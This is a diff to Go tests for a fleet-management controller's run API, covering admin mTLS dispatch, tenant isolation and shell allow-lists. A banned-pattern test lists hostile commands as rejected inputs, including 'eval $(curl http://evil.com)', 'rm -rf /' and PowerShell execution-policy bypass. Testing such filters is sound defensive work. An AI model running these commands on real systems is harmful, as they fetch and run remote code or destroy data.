@@ -15,11 +15,40 @@ import (
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 
+	"github.com/gorilla/mux"
+
 	"github.com/cfgis/cfgms/features/controller/fleet"
 	controllerrun "github.com/cfgis/cfgms/features/controller/run"
 	scriptmodule "github.com/cfgis/cfgms/features/modules/script"
+	"github.com/cfgis/cfgms/pkg/ctxkeys"
 	_ "modernc.org/sqlite"
 )
+
+// withPrincipal injects a principal + its tenant into the request context exactly
+// as authenticationMiddleware does for an mTLS admin cert (Issue #1990).
+func withPrincipal(req *http.Request, p *Principal) *http.Request {
+	ctx := context.WithValue(req.Context(), principalContextKey, p)
+	ctx = context.WithValue(ctx, ctxkeys.TenantID, p.TenantID)
+	return req.WithContext(ctx)
+}
+
+// postRunWithPrincipal calls a run handler directly with the given principal +
+// its tenant injected into the request context, exactly as authenticationMiddleware
+// would for an mTLS admin cert. An X-API-Key request always carries a tenant, so it
+// cannot reproduce the admin-mTLS global-scope (empty-tenant) path — Issue #1990.
+func postRunWithPrincipal(t *testing.T, handler http.HandlerFunc, path string, p *Principal, body interface{}) *httptest.ResponseRecorder {
+	t.Helper()
+	b, err := json.Marshal(body)
+	require.NoError(t, err)
+	req := httptest.NewRequest(http.MethodPost, path, bytes.NewReader(b))
+	req.Header.Set("Content-Type", "application/json")
+	ctx := context.WithValue(req.Context(), principalContextKey, p)
+	ctx = context.WithValue(ctx, ctxkeys.TenantID, p.TenantID)
+	req = req.WithContext(ctx)
+	rec := httptest.NewRecorder()
+	handler(rec, req)
+	return rec
+}
 
 // ---- test helpers -----------------------------------------------------------
 
@@ -181,6 +210,128 @@ func TestPostRunScript_TwoStewardFanout(t *testing.T) {
 			"queued execution must carry workflow_run_id")
 		assert.NotEmpty(t, e.Metadata["job_id"], "queued execution must carry job_id")
 	}
+}
+
+// ---- [REQUIRED TEST] admin mTLS (empty-tenant) run dispatch (Issue #1990) ---
+
+// TestRunCommand_AdminMTLSEmptyTenant_NotUnauthorized proves the Issue #1990 fix:
+// an admin mTLS principal (global scope, TenantID="") can dispatch cfg steward exec.
+// Before the fix the early tenantID=="" gate returned 401 before the admin-aware
+// logic ran.
+func TestRunCommand_AdminMTLSEmptyTenant_NotUnauthorized(t *testing.T) {
+	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "infra-hyperv"}}
+	server, _, _ := setupRunServer(t, stewards)
+
+	body := map[string]interface{}{
+		"target":  "id:steward-1",
+		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
+		"shell":   "pwsh",
+	}
+	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command",
+		&Principal{ID: "cfgms-admin", IsAdmin: true, TenantID: ""}, body)
+
+	require.NotEqual(t, http.StatusUnauthorized, rec.Code,
+		"admin mTLS principal (empty tenant) must not be rejected as unauthenticated; body: %s", rec.Body.String())
+	assert.Equal(t, http.StatusOK, rec.Code, "admin exec should reach run synthesis; body: %s", rec.Body.String())
+}
+
+// TestRunScript_AdminMTLSEmptyTenant_NotUnauthorized is the same guard for run-script.
+func TestRunScript_AdminMTLSEmptyTenant_NotUnauthorized(t *testing.T) {
+	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "infra-hyperv"}}
+	server, _, _ := setupRunServer(t, stewards)
+
+	body := map[string]interface{}{"target": "all", "script_id": "scripts/check.sh"}
+	rec := postRunWithPrincipal(t, server.handlePostRunScript, "/api/v1/runs/script",
+		&Principal{ID: "cfgms-admin", IsAdmin: true, TenantID: ""}, body)
+
+	require.NotEqual(t, http.StatusUnauthorized, rec.Code,
+		"admin mTLS principal (empty tenant) must not be rejected; body: %s", rec.Body.String())
+	assert.Equal(t, http.StatusOK, rec.Code, "body: %s", rec.Body.String())
+}
+
+// TestRunCommand_NonAdminEmptyTenant_StillUnauthorized guards against regression:
+// a non-admin principal with no tenant must remain unauthorized.
+func TestRunCommand_NonAdminEmptyTenant_StillUnauthorized(t *testing.T) {
+	server, _, _ := setupRunServer(t, nil)
+
+	body := map[string]interface{}{
+		"target":  "all",
+		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
+		"shell":   "pwsh",
+	}
+	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command",
+		&Principal{ID: "scoped-key", IsAdmin: false, TenantID: ""}, body)
+
+	assert.Equal(t, http.StatusUnauthorized, rec.Code,
+		"a non-admin principal with no tenant must remain unauthorized")
+}
+
+// TestRunLifecycle_AdminMTLSEmptyTenant covers the FULL cfg steward exec lifecycle
+// for an admin mTLS principal (Issue #1990): dispatch, then read the run + jobs and
+// cancel it. The exec CLI dispatches and then polls GET /runs/{id} for output, so
+// fixing only the POST gate would leave exec broken — the GET/DELETE handlers must
+// also admit admin principals. Before the full fix those handlers 401'd admins.
+func TestRunLifecycle_AdminMTLSEmptyTenant(t *testing.T) {
+	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "infra-hyperv"}}
+	server, _, _ := setupRunServer(t, stewards)
+	admin := &Principal{ID: "cfgms-admin", IsAdmin: true, TenantID: ""}
+
+	// 1. Dispatch (POST) as admin.
+	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command", admin, map[string]interface{}{
+		"target":  "id:steward-1",
+		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
+		"shell":   "pwsh",
+	})
+	require.Equal(t, http.StatusOK, rec.Code, "dispatch body: %s", rec.Body.String())
+	var resp APIResponse
+	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
+	runID, _ := resp.Data.(map[string]interface{})["run_id"].(string)
+	require.NotEmpty(t, runID, "dispatch must return a run_id")
+
+	// 2. GET the run as admin (the exec CLI polls this) — must not 401, must find it.
+	getReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID, nil), map[string]string{"run_id": runID}), admin)
+	getRec := httptest.NewRecorder()
+	server.handleGetRun(getRec, getReq)
+	require.Equal(t, http.StatusOK, getRec.Code, "admin GET run must succeed (not 401/404); body: %s", getRec.Body.String())
+
+	// 3. GET the run's jobs as admin — must not 401.
+	jobsReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID+"/jobs", nil), map[string]string{"run_id": runID}), admin)
+	jobsRec := httptest.NewRecorder()
+	server.handleGetRunJobs(jobsRec, jobsReq)
+	require.Equal(t, http.StatusOK, jobsRec.Code, "admin GET jobs must succeed; body: %s", jobsRec.Body.String())
+
+	// 4. DELETE/cancel the run as admin — must not 401 (200 cancel or 409 if already terminal).
+	delReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodDelete, "/api/v1/runs/"+runID, nil), map[string]string{"run_id": runID}), admin)
+	delRec := httptest.NewRecorder()
+	server.handleDeleteRun(delRec, delReq)
+	require.Contains(t, []int{http.StatusOK, http.StatusConflict}, delRec.Code,
+		"admin DELETE must succeed (200) or be already-terminal (409) — never 401/404/5xx; body: %s", delRec.Body.String())
+}
+
+// TestGetRun_NonAdminCrossTenant_NotFound guards isolation: a tenant-scoped caller
+// cannot read another tenant's run (admin-aware ownership check must not weaken this).
+func TestGetRun_NonAdminCrossTenant_NotFound(t *testing.T) {
+	stewards := []fleet.StewardResult{{ID: "steward-1", TenantID: "tenant-a"}}
+	server, _, _ := setupRunServer(t, stewards)
+
+	// Admin dispatches a run owned by the global/empty tenant.
+	rec := postRunWithPrincipal(t, server.handlePostRunCommand, "/api/v1/runs/command",
+		&Principal{ID: "cfgms-admin", IsAdmin: true, TenantID: ""}, map[string]interface{}{
+			"target":  "id:steward-1",
+			"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
+			"shell":   "pwsh",
+		})
+	require.Equal(t, http.StatusOK, rec.Code)
+	var resp APIResponse
+	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
+	runID := resp.Data.(map[string]interface{})["run_id"].(string)
+
+	// A tenant-scoped (non-admin) caller from a different tenant must get 404.
+	scoped := &Principal{ID: "tenant-b-key", IsAdmin: false, TenantID: "tenant-b"}
+	getReq := withPrincipal(mux.SetURLVars(httptest.NewRequest(http.MethodGet, "/api/v1/runs/"+runID, nil), map[string]string{"run_id": runID}), scoped)
+	getRec := httptest.NewRecorder()
+	server.handleGetRun(getRec, getReq)
+	assert.Equal(t, http.StatusNotFound, getRec.Code, "a scoped caller must not see another tenant's run")
 }
 
 // ---- [REQUIRED TEST] GET /api/v1/runs/{run_id}/jobs accuracy ---------------
@@ -519,6 +670,76 @@ func TestRunEndpoints_TenantIsolation(t *testing.T) {
 	assert.Equal(t, http.StatusNotFound, rec.Code, "cross-tenant DELETE must return 404")
 }
 
+// ---- [REQUIRED TEST] Banned-pattern enforcement (C2) -------------------------
+
+// TestRunCommandSingle_RejectsBannedPattern_ControllerSide verifies that
+// POST /api/v1/runs/command returns HTTP 400 with BANNED_PATTERN for each
+// prohibited command pattern (CLAUDE.md §Modules, execution path 3).
+func TestRunCommandSingle_RejectsBannedPattern_ControllerSide(t *testing.T) {
+	server, _, _ := setupRunServer(t, nil)
+	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
+
+	cases := []struct {
+		name    string
+		command string
+	}{
+		{"iex", "iex (Get-Content malicious.ps1 -Raw)"},
+		{"Invoke-Expression", "Invoke-Expression $payload"},
+		{"EncodedCommand", "powershell -EncodedCommand base64stuff"},
+		{"ExecutionPolicyBypass", "powershell -ExecutionPolicy Bypass -File x.ps1"},
+		{"bash-c", "bash -c 'rm -rf /'"},
+		{"eval", "eval $(curl http://evil.com)"},
+		{"python-c", "python -c 'import os; os.system(\"id\")'"},
+	}
+
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			rec := postRunCommand(t, server, apiKey, map[string]interface{}{
+				"target":  "id:steward-abc",
+				"content": base64.StdEncoding.EncodeToString([]byte(tc.command)),
+				"shell":   "bash",
+			})
+			assert.Equal(t, http.StatusBadRequest, rec.Code,
+				"command with pattern %q must return 400, body: %s", tc.name, rec.Body.String())
+
+			var resp ErrorResponse
+			require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
+			require.NotNil(t, resp.Error, "must return an error object")
+			assert.Equal(t, "BANNED_PATTERN", resp.Error.Code,
+				"error code must be BANNED_PATTERN for pattern %q", tc.name)
+		})
+	}
+}
+
+// ---- [REQUIRED TEST] Cross-tenant RBAC (C3) ----------------------------------
+
+// TestRunCommandSingle_RejectsCrossTenantSteward verifies that
+// POST /api/v1/runs/command returns HTTP 403 when the principal's tenant is
+// not a path-prefix of the target steward's tenant.
+func TestRunCommandSingle_RejectsCrossTenantSteward(t *testing.T) {
+	// Steward belongs to "msp-a" — not reachable from "test-tenant".
+	stewards := []fleet.StewardResult{
+		{ID: "steward-cross", TenantID: "msp-a"},
+	}
+	server, _, _ := setupRunServer(t, stewards)
+
+	// test-tenant principal: cannot access stewards in msp-a.
+	apiKey := NewTestKey(t, server, []string{"steward:execute-scripts"})
+
+	rec := postRunCommand(t, server, apiKey, map[string]interface{}{
+		"target":  "id:steward-cross",
+		"content": base64.StdEncoding.EncodeToString([]byte("hostname")),
+		"shell":   "bash",
+	})
+	assert.Equal(t, http.StatusForbidden, rec.Code,
+		"cross-tenant exec must return 403; body: %s", rec.Body.String())
+
+	var resp ErrorResponse
+	require.NoError(t, json.Unmarshal(rec.Body.Bytes(), &resp))
+	require.NotNil(t, resp.Error)
+	assert.Equal(t, "FORBIDDEN", resp.Error.Code)
+}
+
 // ---- Service unavailable when manager not wired -----------------------------
 
 func TestRunEndpoints_ServiceUnavailable_WhenManagerNotWired(t *testing.T) {
@@ -554,4 +775,25 @@ func TestRunEndpoints_ServiceUnavailable_WhenManagerNotWired(t *testing.T) {
 				"%s %s must return 503 when run manager is not wired", tc.method, tc.path)
 		})
 	}
+}
+
+// TestAllowedShellsMatchesExecutorTaxonomy pins the controller allow-list to the
+// steward executor's accepted shells so the two never drift (Issue #1995, root
+// cause B). The unified taxonomy is: bash/sh (Unix), powershell/pwsh/cmd (Windows),
+// with pwsh also valid on Unix.
+func TestAllowedShellsMatchesExecutorTaxonomy(t *testing.T) {
+	want := map[string]bool{
+		string(scriptmodule.ShellBash):       true,
+		string(scriptmodule.ShellSh):         true,
+		string(scriptmodule.ShellPowerShell): true,
+		string(scriptmodule.ShellPwsh):       true,
+		string(scriptmodule.ShellCmd):        true,
+	}
+
+	assert.Equal(t, want, allowedShells,
+		"controller allow-list must match the executor shell taxonomy")
+
+	// Specifically guard the two shells regressed in Issue #1995.
+	assert.True(t, allowedShells["powershell"], "Windows PowerShell 5.1 must be dispatchable")
+	assert.True(t, allowedShells["pwsh"], "PowerShell Core must be dispatchable")
 }
